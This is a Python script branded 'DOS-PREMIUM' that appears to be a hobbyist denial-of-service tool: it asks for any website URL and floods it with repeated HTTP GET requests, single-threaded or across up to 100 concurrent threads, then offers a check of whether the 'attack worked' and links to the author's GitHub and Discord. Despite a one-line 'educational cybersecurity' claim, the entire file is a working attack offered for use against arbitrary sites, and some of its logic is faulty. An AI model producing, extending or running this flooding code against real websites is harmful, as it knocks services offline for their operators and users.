import threading
import requests
import os
import colorama
from colorama import Fore
from bs4 import BeautifulSoup
import sys
import time
import getpass
import concurrent.futures
import webbrowser

##CODED BY ZED####






username = getpass.getuser()


def fasttypewriter(text, delay=0.0003):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()


def slowtypewriter(text, delay=0.003):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()


ascii = """


██████╗  ██████╗ ███████╗    ██████╗ ██████╗ ███████╗███╗   ███╗██╗██╗   ██╗███╗   ███╗
██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██║   ██║████╗ ████║
██║  ██║██║   ██║███████╗    ██████╔╝██████╔╝█████╗  ██╔████╔██║██║██║   ██║██╔████╔██║
██║  ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║██║██║   ██║██║╚██╔╝██║
██████╔╝╚██████╔╝███████║    ██║     ██║  ██║███████╗██║ ╚═╝ ██║██║╚██████╔╝██║ ╚═╝ ██║
╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝

                                                  | made by zed |
│━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━│
         1. DOS ATTACK |  | 2. CHECK IF ATTACK WORKED |  | 3. GITHUB/DISCORD |
       ////////////////////////////////////////////////////////////////////////
                        =============================
                               | 4. help/info |
                            """

fasttypewriter(Fore.MAGENTA + ascii + Fore.RESET)

print()
print()
selection = input(Fore.MAGENTA + f"| [•] {username}@DOS-PREMIUM:~$ [1-4] - ")

if selection == "1":

    print()
    print("----------------------------------------")
    website = input("\n   URL? [.com] [https://] [https://]: ").strip()

    if not website.startswith(("http://", "https://")):
        website = "http://" + website

    attacktype = input("\n    Weak or Strong? [strong/weak]: ").strip().lower()

    if attacktype == "weak":
        print("\nSPAM Ctrl + C to stop attack.")
        try:
            while True:
                response = requests.get(website)
                print(f"\nATTACKING {website} RESPONSE: {response.status_code}")
        except KeyboardInterrupt:
            print("\nStopped.")

    elif attacktype == "strong" or "Strong":
        print("\nSPAM Ctrl + C, To Stop Attack.")

        def worker_task(worker_id):
            while True:
                try:
                    response = requests.get(website)
                    print(f"\nATTACKING {website} RESPONSE: {response.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"\nRequest failed: {e}")

        try:
            num_tasks = int(input("\n   How many Bots or Tasks Attacking at once? [1-100] ").strip())
            num_tasks = max(1, min(num_tasks, 100))

            with concurrent.futures.ThreadPoolExecutor(max_workers=num_tasks) as executor:
                tasks = range(1, num_tasks + 1)
                results = executor.map(worker_task, tasks)
                for result in results:
                    print(result)
        except KeyboardInterrupt:
            print()
        except ValueError:
            print("\nEnter a valid number.")

if selection == "2":
    websitetocheck = input("\nEnter Website here: ")

    #error handling
    if not websitetocheck.startswith(("http://", "https://")):
            websitetocheck = "http://" + websitetocheck

    try:
        response2 = requests.get(websitetocheck, timeout=10)

        if response2.status_code == 400:
            print("Attack Worked.")
        elif response2.status_code == 200:
            print("Attack did not work.")
        else:
            print("Code is uncertain, check the website here >", websitetocheck)
    except requests.exceptions.RequestException as e:
        print(f"\nCouldn't reach site: {e}")

    input("Enter to close.")

if selection == "3":
    webbrowser.open("https://github.com/zedwed11")
    webbrowser.open("https://discord.gg/jw8DUeJ3Q")
    webbrowser.open("https://github.com/zedwed11/Aya-Multitool")


if selection == "4":
    print("\nThis is DOS-PREMIUN")
    print("\nA Tool coded by Zed for Website and Server-Stressing for Educational Cybersecurity.")
    print("\nKEEP IN MIND -- A DoS attack is NOT as strong as a DDoS Attack.")
    print("\nResults of this tool vary on the website and it's server. Attack may work, Attack may Not.")
    print()
    print("\n===============================================")
    input("\nEnter to close.")

else:
    print("Invalid Selection. Choose [1-4].")